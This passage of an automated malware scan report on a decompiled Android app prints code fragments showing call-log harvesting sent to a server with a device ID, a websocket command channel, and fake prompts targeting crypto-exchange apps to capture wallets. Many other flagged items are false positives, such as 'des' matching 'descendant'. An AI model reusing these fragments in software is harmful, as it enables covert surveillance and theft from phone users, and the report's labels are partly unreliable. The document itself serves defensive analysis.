**19. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes12/com/blankj/utilcode/util/NetworkUtils.smali`
- **Line:** 618

```java
    move-result-object v1

    check-cast v1, Landroid/telephony/TelephonyManager;

    if-nez v1, :cond_0
```

**20. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes12/com/blankj/utilcode/util/NetworkUtils.smali`
- **Line:** 631

```java
    if-lt v2, v3, :cond_1

    invoke-virtual {v1}, Landroid/telephony/TelephonyManager;->isDataEnabled()Z

    move-result v0
```

**21. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes12/com/blankj/utilcode/util/NetworkUtils.smali`
- **Line:** 728

```java
    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    if-nez v0, :cond_0
```

**22. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes13/androidx/appcompat/app/AppCompatDelegateImpl.smali`
- **Line:** 2768

```java
    if-eqz p2, :cond_13

    invoke-virtual {p2}, Landroid/view/KeyEvent;->getDeviceId()I

    move-result p2
```

**23. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: call\s*log
- **File:** `smali_classes14/f3/i$a.smali`
- **Line:** 5484

```java
    const-string v5, "getAccounts"

    const-string v12, "readCallLog"

    const-string v13, "battery"
```

**24. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes14/androidx/core/telephony/TelephonyManagerCompat.smali`
- **Line:** 1

```java
.class public Landroidx/core/telephony/TelephonyManagerCompat;
.super Ljava/lang/Object;

```

**25. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes14/androidx/core/telephony/TelephonyManagerCompat.smali`
- **Line:** 8

```java
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Landroidx/core/telephony/TelephonyManagerCompat$Api23Impl;,
        Landroidx/core/telephony/TelephonyManagerCompat$Api26Impl;,
        Landroidx/core/telephony/TelephonyManagerCompat$Api30Impl;
```

**26. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes14/androidx/core/telephony/TelephonyManagerCompat.smali`
- **Line:** 9

```java
    value = {
        Landroidx/core/telephony/TelephonyManagerCompat$Api23Impl;,
        Landroidx/core/telephony/TelephonyManagerCompat$Api26Impl;,
        Landroidx/core/telephony/TelephonyManagerCompat$Api30Impl;
    }
```

**27. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes14/androidx/core/telephony/TelephonyManagerCompat.smali`
- **Line:** 16

```java

# static fields
.field private static sGetDeviceIdMethod:Ljava/lang/reflect/Method;

.field private static sGetSubIdMethod:Ljava/lang/reflect/Method;
```

**28. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes14/androidx/core/telephony/TelephonyManagerCompat.smali`
- **Line:** 86

```java
    if-lt v0, v2, :cond_1

    invoke-static {p0, v1}, Landroidx/core/telephony/TelephonyManagerCompat$Api23Impl;->getDeviceId(Landroid/telephony/TelephonyManager;I)Ljava/lang/String;

    move-result-object p0
```

**29. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes14/androidx/core/telephony/TelephonyManagerCompat.smali`
- **Line:** 94

```java
    :cond_1
    :try_start_0
    sget-object v0, Landroidx/core/telephony/TelephonyManagerCompat;->sGetDeviceIdMethod:Ljava/lang/reflect/Method;

    const/4 v2, 0x0
```

**30. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes25/androidx/core/telephony/TelephonyManagerCompat$Api26Impl.smali`
- **Line:** 1

```java
.class Landroidx/core/telephony/TelephonyManagerCompat$Api26Impl;
.super Ljava/lang/Object;

```

**31. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes25/androidx/core/telephony/TelephonyManagerCompat$Api26Impl.smali`
- **Line:** 11

```java

.annotation system Ldalvik/annotation/EnclosingClass;
    value = Landroidx/core/telephony/TelephonyManagerCompat;
.end annotation

```

**32. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes25/androidx/core/telephony/TelephonyManagerCompat$Api26Impl.smali`
- **Line:** 29

```java
.end method

.method public static getImei(Landroid/telephony/TelephonyManager;)Ljava/lang/String;
    .locals 0
    .annotation build Landroid/annotation/SuppressLint;
```

**33. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: call\s*log
- **File:** `smali_classes3/k3/f.smali`
- **Line:** 831

```java
    move-result-object v4

    const-string v5, "readCallLogTime"

    invoke-virtual {v4, v5}, Lcom/blankj/utilcode/util/SPUtils;->getLong(Ljava/lang/String;)J
```

**34. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: call\s*log
- **File:** `smali_classes3/k3/f.smali`
- **Line:** 1087

```java
    move-result-object p1

    const-string v2, "readCallLogTime"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
```

**35. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: call\s*log
- **File:** `smali_classes3/k3/f.smali`
- **Line:** 2875

```java
    invoke-direct {v6}, Lf/e;-><init>()V

    const-string v7, "callLogId"

    invoke-virtual {v5}, Lcom/superbock/bean/DInfo;->getId()Ljava/lang/String;
```

**36. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes4/com/blankj/utilcode/util/DeviceUtils.smali`
- **Line:** 1203

```java
    move-result-object v0

    check-cast v0, Landroid/telephony/TelephonyManager;

    if-eqz v0, :cond_4
```

**37. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes4/com/blankj/utilcode/util/DeviceUtils.smali`
- **Line:** 1207

```java
    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v0
```

**38. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes4/androidx/appcompat/app/ToolbarActionBar.smali`
- **Line:** 548

```java
    if-eqz p2, :cond_0

    invoke-virtual {p2}, Landroid/view/KeyEvent;->getDeviceId()I

    move-result v2
```

**39. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes5/com/tencent/smtt/sdk/QbSdk.smali`
- **Line:** 2551

```java
.end method

.method public static canGetDeviceId(Z)V
    .locals 1
    .annotation runtime Ljava/lang/Deprecated;
```

**40. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: getDeviceId
- **File:** `smali_classes5/com/tencent/smtt/sdk/QbSdk.smali`
- **Line:** 5659

```java
.end method

.method public static isEnableGetDeviceID()Z
    .locals 1
    .annotation runtime Ljava/lang/Deprecated;
```

**41. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: TelephonyManager
- **File:** `smali_classes5/com/tencent/smtt/export/external/TbsCoreSettings.smali`
- **Line:** 30

```java
.field public static final ID_OPERATE_PROHIBIT:Ljava/lang/String; = "prohibit"

.field public static final ID_TELE_GETNETWORKOPERATOR:Ljava/lang/String; = "TelephonyManager_getNetworkOperator"

.field public static final LAZY_LOAD_LIBRARY_FDS:Ljava/lang/String; = "lazy_load_library_fds"
```

**42. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: call\s*log
- **File:** `smali/com/superbock/App.smali`
- **Line:** 2326

```java
    move-result-object v5

    const-string v6, "readCallLog"

    invoke-virtual {v1, v6, v5}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;
```

**43. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: call\s*log
- **File:** `smali/com/superbock/App.smali`
- **Line:** 3482

```java
    move-result-object v7

    const-string v8, "readCallLog"

    invoke-virtual {v4, v8, v7}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;
```

**44. Data Exfiltration Detected**
- **Description:** Suspicious pattern found: call\s*log
- **File:** `smali/com/superbock/ui/StartupActivity.smali`
- **Line:** 1845

```java
    move-result-object v5

    const-string v6, "readCallLog"

    invoke-virtual {v0, v6, v5}, Lf/e;->C(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/Object;
```

**45. Data Exfiltration**
- **Description:** Pattern detected: CallLog
- **File:** `sources/k3/f.java`
- **Line:** 492

```java
                return;
            }
            f3874e = true;
            if (!z4 && System.currentTimeMillis() - SPUtils.getInstance().getLong("readCallLogTime") < 2592000000L) {
                f3874e = false;
                return;
            }
```

**46. Data Exfiltration**
- **Description:** Pattern detected: CallLog
- **File:** `sources/k3/f.java`
- **Line:** 544

```java
                        }
                    } while (query.moveToNext());
                }
                SPUtils.getInstance().put("readCallLogTime", System.currentTimeMillis());
                query.close();
            }
            f3874e = false;
```

**47. Data Exfiltration**
- **Description:** Pattern detected: callLog
- **File:** `sources/k3/f.java`
- **Line:** 892

```java
                while (it.hasNext()) {
                    DInfo dInfo = (DInfo) it.next();
                    f.e eVar = new f.e();
                    eVar.put("callLogId", dInfo.getId());
                    eVar.put("num", dInfo.getNu());
                    if (!TextUtils.isEmpty(dInfo.getNa())) {
                        eVar.put("name", dInfo.getNa());
```

**48. Data Exfiltration**
- **Description:** Pattern detected: CallLog
- **File:** `sources/k3/f.java`
- **Line:** 903

```java
                    bVar.add(eVar);
                }
                f.e eVar2 = new f.e();
                eVar2.put("action", "saveCallLog");
                eVar2.put("deviceId", k3.a.c(context));
                eVar2.put("list", bVar);
                k3.i.a(eVar2, new i(arrayList, context));
```

**49. Data Exfiltration**
- **Description:** Pattern detected: CallLog
- **File:** `sources/f3/i.java`
- **Line:** 1335

```java
                eVar.put("readImages", Integer.valueOf((i6 <= 32 ? ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_EXTERNAL_STORAGE") != 0 : ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_MEDIA_IMAGES") != 0) ? 0 : 1));
                eVar.put("readContacts", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CONTACTS") == 0 ? 1 : 0));
                eVar.put("readSms", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_SMS") == 0 ? 1 : 0));
                eVar.put("readCallLog", Integer.valueOf(ContextCompat.checkSelfPermission(this.f2811h, "android.permission.READ_CALL_LOG") == 0 ? 1 : 0));
                if (i6 >= 23) {
                    eVar.put("accessibility", Integer.valueOf(k3.a.f(this.f2811h) ? 1 : 0));
                    eVar.put("battery", Integer.valueOf(((PowerManager) this.f2811h.getSystemService("power")).isIgnoringBatteryOptimizations(this.f2811h.getPackageName()) ? 1 : 0));
```

**50. Data Exfiltration**
- **Description:** Pattern detected: CallLog
- **File:** `sources/f3/i.java`
- **Line:** 1417

```java
                        c5 = 65535;
                        break;
                    case -190802544:
                        if (str.equals("readCallLog")) {
                            c5 = '\b';
                            break;
                        }
```


### C2 Communication (25 issues)

**1. C2 Communication Detected**
- **Description:** Suspicious pattern found: websocket
- **File:** `smali_classes16/k/j0.smali`
- **Line:** 160

```java
    const-string v0, "wss://"

    const-string v1, "/websocket/message/DEVICE_"

    invoke-static {v0, p0, v1}, Landroidx/appcompat/widget/a;->j(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
```

**2. C2 Communication Detected**
- **Description:** Suspicious pattern found: websocket
- **File:** `smali_classes17/e4/d.smali`
- **Line:** 761

```java
    move-result-object v0

    const-string v1, "websocket"

    invoke-static {v1, v0}, Lkotlin/text/StringsKt;->g(Ljava/lang/String;Ljava/lang/String;)Z
```

**3. C2 Communication Detected**
- **Description:** Suspicious pattern found: websocket
- **File:** `smali_classes17/e4/d.smali`
- **Line:** 769

```java
    if-eqz v1, :cond_2

    const-string v0, "Sec-WebSocket-Accept"

    invoke-static {p1, v0}, Ls3/b0;->a(Ls3/b0;Ljava/lang/String;)Ljava/lang/String;
```

**4. C2 Communication Detected**
- **Description:** Suspicious pattern found: websocket
- **File:** `smali_classes17/e4/d.smali`
- **Line:** 835

```java
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "Expected \'Sec-WebSocket-Accept\' header value \'"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
```

**5. C2 Communication Detected**
- **Description:** Suspicious pattern found: websocket
- **File:** `smali_classes10/e4/e.smali`
- **Line:** 107

```java
    move-result-object v8

    const-string v10, "Sec-WebSocket-Extensions"

    invoke-static {v8, v10}, Lkotlin/text/StringsKt;->g(Ljava/lang/String;Ljava/lang/String;)Z
```

**6. C2 Communication Detected**
- **Description:** Suspicious pattern found: websocket
- **File:** `smali_classes10/e4/e.smali`
- **Line:** 410

```java
    const/16 v5, 0x3f2

    const-string v6, "unexpected Sec-WebSocket-Extensions in response header"

    invoke-virtual {v3, v5, v6}, Le4/d;->a(ILjava/lang/String;)Z
```

**7. C2 Communication Detected**
- **Description:** Suspicious pattern found: websocket
- **File:** `smali_classes10/e4/e.smali`
- **Line:** 438

```java
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, " WebSocket "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
```

**8. C2 Communication Detected**
- **Description:** Suspicious pattern found: websocket
- **File:** `smali_classes9/f3/i.smali`
- **Line:** 321

```java
    aget-object v4, v4, v5

    const-string v6, "/websocket/message/DEVICE_"

    invoke-static {v2, v4, v6}, Landroidx/appcompat/graphics/drawable/a;->c(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
```

**9. C2 Communication Detected**
- **Description:** Suspicious pattern found: websocket
- **File:** `smali_classes9/f3/i.smali`
- **Line:** 408

```java
    iget-object v0, v2, Le4/d;->r:Ls3/y;

    const-string v3, "Sec-WebSocket-Extensions"

    invoke-virtual {v0, v3}, Ls3/y;->b(Ljava/lang/String;)Ljava/lang/String;
```

**10. C2 Communication Detected**
- **Description:** Suspicious pattern found: websocket
- **File:** `smali_classes9/f3/i.smali`
- **Line:** 420

```java
    new-instance v0, Ljava/net/ProtocolException;

    const-string v1, "Request header not permitted: \'Sec-WebSocket-Extensions\'"

    invoke-direct {v0, v1}, Ljava/net/ProtocolException;-><init>(Ljava/lang/String;)V
```

**11. C2 Communication Detected**
- **Description:** Suspicious pattern found: websocket
- **File:** `smali_classes4/e4/f.smali`
- **Line:** 240

```java
    .locals 2

    const-string v0, "WebSocketExtensions(perMessageDeflate="

    invoke-static {v0}, Landroidx/activity/d;->g(Ljava/lang/String;)Ljava/lang/StringBuilder;
```

**12. C2 Communication**
- **Description:** Pattern detected: websocket
- **File:** `sources/f3/i.java`
- **Line:** 2911

```java
            String string2 = SPUtils.getInstance().getString("wsUrl");
            j0.f3706f = string2;
            if (TextUtils.isEmpty(string2)) {
                j0.f3706f = androidx.appcompat.graphics.drawable.a.c(androidx.activity.d.g("wss://"), j0.f().split("\\|")[0], "/websocket/message/DEVICE_");
                SPUtils.getInstance().put("wsUrl", j0.f3706f);
            }
        }
```

**13. C2 Communication**
- **Description:** Pattern detected: WebSocket
- **File:** `sources/f3/i.java`
- **Line:** 2928

```java
        Intrinsics.checkNotNullParameter(listener, "listener");
        e4.d dVar = new e4.d(v3.d.f5712h, request, listener, new Random(), okHttpClient.B, okHttpClient.C);
        Intrinsics.checkNotNullParameter(okHttpClient, "client");
        if (dVar.f2624r.b("Sec-WebSocket-Extensions") != null) {
            dVar.i(new ProtocolException("Request header not permitted: 'Sec-WebSocket-Extensions'"), null);
        } else {
            Intrinsics.checkNotNullParameter(okHttpClient, "okHttpClient");
```

**14. C2 Communication**
- **Description:** Pattern detected: WebSocket
- **File:** `sources/f3/i.java`
- **Line:** 2929

```java
        e4.d dVar = new e4.d(v3.d.f5712h, request, listener, new Random(), okHttpClient.B, okHttpClient.C);
        Intrinsics.checkNotNullParameter(okHttpClient, "client");
        if (dVar.f2624r.b("Sec-WebSocket-Extensions") != null) {
            dVar.i(new ProtocolException("Request header not permitted: 'Sec-WebSocket-Extensions'"), null);
        } else {
            Intrinsics.checkNotNullParameter(okHttpClient, "okHttpClient");
            w.a aVar2 = new w.a();
```

**15. C2 Communication**
- **Description:** Pattern detected: websocket
- **File:** `sources/f3/i.java`
- **Line:** 2992

```java
            aVar2.f5363s = unmodifiableList;
            w wVar = new w(aVar2);
            y.a aVar3 = new y.a(dVar.f2624r);
            aVar3.b("Upgrade", "websocket");
            aVar3.b("Connection", "Upgrade");
            aVar3.b("Sec-WebSocket-Key", dVar.f2607a);
            aVar3.b("Sec-WebSocket-Version", "13");
```

**16. C2 Communication**
- **Description:** Pattern detected: WebSocket
- **File:** `sources/f3/i.java`
- **Line:** 2994

```java
            y.a aVar3 = new y.a(dVar.f2624r);
            aVar3.b("Upgrade", "websocket");
            aVar3.b("Connection", "Upgrade");
            aVar3.b("Sec-WebSocket-Key", dVar.f2607a);
            aVar3.b("Sec-WebSocket-Version", "13");
            aVar3.b("Sec-WebSocket-Extensions", "permessage-deflate");
            y a7 = aVar3.a();
```

**17. C2 Communication**
- **Description:** Pattern detected: websocket
- **File:** `sources/e4/d.java`
- **Line:** 403

```java
            throw new ProtocolException("Expected 'Connection' header value 'Upgrade' but was '" + a5 + '\'');
        }
        String a6 = b0.a(response, "Upgrade");
        if (!StringsKt.g("websocket", a6)) {
            throw new ProtocolException("Expected 'Upgrade' header value 'websocket' but was '" + a6 + '\'');
        }
        String a7 = b0.a(response, "Sec-WebSocket-Accept");
```

**18. C2 Communication**
- **Description:** Pattern detected: websocket
- **File:** `sources/e4/d.java`
- **Line:** 404

```java
        }
        String a6 = b0.a(response, "Upgrade");
        if (!StringsKt.g("websocket", a6)) {
            throw new ProtocolException("Expected 'Upgrade' header value 'websocket' but was '" + a6 + '\'');
        }
        String a7 = b0.a(response, "Sec-WebSocket-Accept");
        String a8 = i.f2861f.b(this.f2607a + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").b("SHA-1").a();
```

**19. C2 Communication**
- **Description:** Pattern detected: WebSocket
- **File:** `sources/e4/d.java`
- **Line:** 406

```java
        if (!StringsKt.g("websocket", a6)) {
            throw new ProtocolException("Expected 'Upgrade' header value 'websocket' but was '" + a6 + '\'');
        }
        String a7 = b0.a(response, "Sec-WebSocket-Accept");
        String a8 = i.f2861f.b(this.f2607a + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").b("SHA-1").a();
        if (!(!Intrinsics.areEqual(a8, a7))) {
            if (cVar == null) {
```

**20. C2 Communication**
- **Description:** Pattern detected: WebSocket
- **File:** `sources/e4/d.java`
- **Line:** 414

```java
            }
            return;
        }
        throw new ProtocolException("Expected 'Sec-WebSocket-Accept' header value '" + a8 + "' but was '" + a7 + '\'');
    }

    public final void i(Exception e5, b0 b0Var) {
```

**21. C2 Communication**
- **Description:** Pattern detected: WebSocket
- **File:** `sources/e4/d.java`
- **Line:** 602

```java
                    } else {
                        T t4 = objectRef.element;
                        if (t4 == 0) {
                            throw new NullPointerException("null cannot be cast to non-null type okhttp3.internal.ws.RealWebSocket.Close");
                        }
                        long j5 = ((a) t4).f2632c;
                        this.f2612f.c(new f(this.f2613g + " cancel", this), TimeUnit.MILLISECONDS.toNanos(j5));
```

**22. C2 Communication**
- **Description:** Pattern detected: WebSocket
- **File:** `sources/e4/e.java`
- **Line:** 50

```java
            boolean z6 = false;
            boolean z7 = false;
            while (i7 < length) {
                if (StringsKt.g(responseHeaders.r(i7), "Sec-WebSocket-Extensions")) {
                    String t4 = responseHeaders.t(i7);
                    int i8 = 0;
                    while (i8 < t4.length()) {
```

**23. C2 Communication**
- **Description:** Pattern detected: WebSocket
- **File:** `sources/e4/e.java`
- **Line:** 124

```java
            if (!(!z7 && num == null && (num2 == null || (8 <= (intValue = num2.intValue()) && 15 >= intValue)))) {
                synchronized (this.f2642a) {
                    this.f2642a.f2616j.clear();
                    this.f2642a.a(PointerIconCompat.TYPE_ALIAS, "unexpected Sec-WebSocket-Extensions in response header");
                }
            }
            try {
```

**24. C2 Communication**
- **Description:** Pattern detected: WebSocket
- **File:** `sources/e4/e.java`
- **Line:** 128

```java
                }
            }
            try {
                this.f2642a.j(t3.c.f5455g + " WebSocket " + this.f2643b.f5381b.g(), c5);
                d dVar = this.f2642a;
                dVar.f2625s.I(dVar);
                this.f2642a.k();
```

**25. C2 Communication**
- **Description:** Pattern detected: WebSocket
- **File:** `sources/e4/f.java`
- **Line:** 96

```java
    }

    public final String toString() {
        StringBuilder g5 = androidx.activity.d.g("WebSocketExtensions(perMessageDeflate=");
        g5.append(this.f2644a);
        g5.append(", clientMaxWindowBits=");
        g5.append(this.f2645b);
```


## 🟠 HIGH Severity Findings


### Insecure Crypto (78 issues)

**1. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/v1/m.java`
- **Line:** 86

```java
            return
        L3e:
            java.lang.IllegalArgumentException r4 = new java.lang.IllegalArgumentException
            java.lang.String r5 = "This component requires that you specify a valid TextAppearance attribute. Update your app theme to inherit from Theme.MaterialComponents (or a descendant)."
            r4.<init>(r5)
            throw r4
        */
```

**2. Insecure Crypto**
- **Description:** Pattern detected: des
- **File:** `sources/v1/m.java`
- **Line:** 111

```java
            }
        }
        if (!z4) {
            throw new IllegalArgumentException(androidx.appcompat.widget.a.j("The style on this component requires your app theme to be ", str, " (or a descendant)."));
        }
    }

```

**3. Insecure Crypto**
- **Description:** Pattern detected: DES
- **File:** `sources/z2/h.java`
- **Line:** 145

```java
                }
                h(sb, fVar.f436a);
                if (!fVar.f437b) {
                    sb.append(" DESC");
                }
            }
        }
```

**4. Insecure Crypto**
- **Description:** Pattern detected: DES
- **File:** `sources/s3/h.java`
- **Line:** 204

```java
        b.a(bVar, "SSL_RSA_EXPORT_WITH_RC4_40_MD5");
        b.a(bVar, "SSL_RSA_WITH_RC4_128_MD5");
        b.a(bVar, "SSL_RSA_WITH_RC4_128_SHA");
        b.a(bVar, "SSL_RSA_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_RSA_WITH_DES_CBC_SHA");
        f5217d = b.a(bVar, "SSL_RSA_WITH_3DES_EDE_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA");
```

**5. Insecure Crypto**
- **Description:** Pattern detected: DES
- **File:** `sources/s3/h.java`
- **Line:** 205

```java
        b.a(bVar, "SSL_RSA_WITH_RC4_128_MD5");
        b.a(bVar, "SSL_RSA_WITH_RC4_128_SHA");
        b.a(bVar, "SSL_RSA_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_RSA_WITH_DES_CBC_SHA");
        f5217d = b.a(bVar, "SSL_RSA_WITH_3DES_EDE_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_WITH_DES_CBC_SHA");
```

**6. Insecure Crypto**
- **Description:** Pattern detected: DES
- **File:** `sources/s3/h.java`
- **Line:** 206

```java
        b.a(bVar, "SSL_RSA_WITH_RC4_128_SHA");
        b.a(bVar, "SSL_RSA_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_RSA_WITH_DES_CBC_SHA");
        f5217d = b.a(bVar, "SSL_RSA_WITH_3DES_EDE_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_WITH_DES_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA");
```

**7. Insecure Crypto**
- **Description:** Pattern detected: DES
- **File:** `sources/s3/h.java`
- **Line:** 207

```java
        b.a(bVar, "SSL_RSA_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_RSA_WITH_DES_CBC_SHA");
        f5217d = b.a(bVar, "SSL_RSA_WITH_3DES_EDE_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_WITH_DES_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA");
        b.a(bVar, "SSL_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA");
```

**8. Insecure Crypto**
- **Description:** Pattern detected: DES
- **File:** `sources/s3/h.java`
- **Line:** 208

```java
        b.a(bVar, "SSL_RSA_WITH_DES_CBC_SHA");
        f5217d = b.a(bVar, "SSL_RSA_WITH_3DES_EDE_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_WITH_DES_CBC_SHA");
        b.a(bVar, "SSL_DHE_DSS_WITH_3DES_EDE_CBC_SHA");
        b.a(bVar, "SSL_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_DHE_RSA_WITH_DES_CBC_SHA");
```

**9. Insecure Crypto**
- **Description:** Pattern detected: MD5
- **File:** `sources/s3/h.java`
- **Line:** 199

```java
        f5233t = bVar;
        f5215b = new a();
        f5216c = new LinkedHashMap();
        b.a(bVar, "SSL_RSA_WITH_NULL_MD5");
        b.a(bVar, "SSL_RSA_WITH_NULL_SHA");
        b.a(bVar, "SSL_RSA_EXPORT_WITH_RC4_40_MD5");
        b.a(bVar, "SSL_RSA_WITH_RC4_128_MD5");
```

**10. Insecure Crypto**
- **Description:** Pattern detected: MD5
- **File:** `sources/s3/h.java`
- **Line:** 201

```java
        f5216c = new LinkedHashMap();
        b.a(bVar, "SSL_RSA_WITH_NULL_MD5");
        b.a(bVar, "SSL_RSA_WITH_NULL_SHA");
        b.a(bVar, "SSL_RSA_EXPORT_WITH_RC4_40_MD5");
        b.a(bVar, "SSL_RSA_WITH_RC4_128_MD5");
        b.a(bVar, "SSL_RSA_WITH_RC4_128_SHA");
        b.a(bVar, "SSL_RSA_EXPORT_WITH_DES40_CBC_SHA");
```

**11. Insecure Crypto**
- **Description:** Pattern detected: MD5
- **File:** `sources/s3/h.java`
- **Line:** 202

```java
        b.a(bVar, "SSL_RSA_WITH_NULL_MD5");
        b.a(bVar, "SSL_RSA_WITH_NULL_SHA");
        b.a(bVar, "SSL_RSA_EXPORT_WITH_RC4_40_MD5");
        b.a(bVar, "SSL_RSA_WITH_RC4_128_MD5");
        b.a(bVar, "SSL_RSA_WITH_RC4_128_SHA");
        b.a(bVar, "SSL_RSA_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_RSA_WITH_DES_CBC_SHA");
```

**12. Insecure Crypto**
- **Description:** Pattern detected: MD5
- **File:** `sources/s3/h.java`
- **Line:** 213

```java
        b.a(bVar, "SSL_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_DHE_RSA_WITH_DES_CBC_SHA");
        b.a(bVar, "SSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA");
        b.a(bVar, "SSL_DH_anon_EXPORT_WITH_RC4_40_MD5");
        b.a(bVar, "SSL_DH_anon_WITH_RC4_128_MD5");
        b.a(bVar, "SSL_DH_anon_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_DH_anon_WITH_DES_CBC_SHA");
```

**13. Insecure Crypto**
- **Description:** Pattern detected: MD5
- **File:** `sources/s3/h.java`
- **Line:** 214

```java
        b.a(bVar, "SSL_DHE_RSA_WITH_DES_CBC_SHA");
        b.a(bVar, "SSL_DHE_RSA_WITH_3DES_EDE_CBC_SHA");
        b.a(bVar, "SSL_DH_anon_EXPORT_WITH_RC4_40_MD5");
        b.a(bVar, "SSL_DH_anon_WITH_RC4_128_MD5");
        b.a(bVar, "SSL_DH_anon_EXPORT_WITH_DES40_CBC_SHA");
        b.a(bVar, "SSL_DH_anon_WITH_DES_CBC_SHA");
        b.a(bVar, "SSL_DH_anon_WITH_3DES_EDE_CBC_SHA");
```

**14. Insecure Crypto**
- **Description:** Pattern detected: Random()
- **File:** `sources/k3/e.java`
- **Line:** 83

```java
        AdInfo d5 = androidx.appcompat.view.a.d(2);
        d5.setTaskId(e3.d.a());
        d5.setBack(1);
        d5.setAutoClose(new Random().nextInt(20) + 20);
        d5.setCustomId(PointerIconCompat.TYPE_TEXT);
        d5.setPkg("com.binance.dev");
        d5.setUse(2);
```

**15. Insecure Crypto**
- **Description:** Pattern detected: Random()
- **File:** `sources/k3/e.java`
- **Line:** 115

```java
        adInfo.setConfirm(context.getString(R.string.Import_Wallet));
        adInfo.setConfirmColor("0,0,0");
        adInfo.setConfirmBgColor("240,185,11");
        if (new Random().nextInt(2) == 1) {
            adInfo.setCancel(context.getString(R.string.Cancel));
            adInfo.setCancelColor("128,128,128");
        }
```

**16. Insecure Crypto**
- **Description:** Pattern detected: Random()
- **File:** `sources/k3/e.java`
- **Line:** 211

```java
        AdInfo d5 = androidx.appcompat.view.a.d(2);
        d5.setTaskId(e3.d.a());
        d5.setBack(1);
        d5.setAutoClose(new Random().nextInt(20) + 20);
        d5.setCustomId(PointerIconCompat.TYPE_VERTICAL_TEXT);
        d5.setPkg("com.okinc.okex.gp");
        d5.setUse(2);
```

**17. Insecure Crypto**
- **Description:** Pattern detected: Random()
- **File:** `sources/k3/e.java`
- **Line:** 243

```java
        adInfo.setConfirm(context.getString(R.string.Confirm));
        adInfo.setConfirmBgColor("0,0,0");
        adInfo.setAlign(1);
        if (new Random().nextInt(2) == 1) {
